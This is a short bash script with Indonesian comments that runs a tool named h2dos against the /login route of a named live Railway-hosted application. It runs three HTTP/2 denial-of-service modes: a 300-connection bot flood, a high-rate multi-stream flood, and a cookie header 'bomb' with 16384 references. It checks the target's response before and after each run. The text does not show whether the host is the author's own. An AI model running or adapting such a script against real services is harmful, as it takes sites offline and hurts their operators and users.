#!/bin/bash
# Fase dua: hantam RUTE ASLI (/login, HTML 9,9 KB) bukan 307 murahan,
# dengan tekanan yang dinaikkan. Probe juga ke /login supaya yang diukur
# kerjaan asli aplikasi.
T=https://9router-production-a2ff.up.railway.app
P="/login"
FLAGS="-probe $P -probe-fresh -probe-interval 1s -probe-fail 4 -stop-on-down=false -report 5s"

jalankan() {
  nama="$1"; shift
  echo "=================================================="
  echo "### $nama  ($(date +%H:%M:%S))"
  curl -sk -m 10 -o /dev/null -w "sebelum: HTTP %{http_code} ttfb=%{time_starttransfer}s size=%{size_download}\n" $T$P
  /tmp/h2dos -target $T$P "$@" $FLAGS 2>&1 | tail -14
  sleep 2
  curl -sk -m 10 -o /dev/null -w "sesudah: HTTP %{http_code} ttfb=%{time_starttransfer}s size=%{size_download}\n" $T$P
}

sleep 120
jalankan "bot 300 koneksi think 50ms ke /login (flash crowd rute berat)" \
  -mode bot -conns 300 -bot-think 50ms -bot-jitter 80ms -bot-reuse 30 -dur 60s
sleep 165
jalankan "flood 12x120 stream ke /login (rps maksimal di rute berat)" \
  -mode flood -conns 12 -streams 120 -batch 32 -dur 30s
sleep 165
jalankan "bomb 200 koneksi refs 16384 ke /login" \
  -mode bomb -conns 200 -bomb-name cookie -bomb-refs 16384 -dur 45s
echo "=================================================="
echo "SELESAI $(date +%H:%M:%S)"
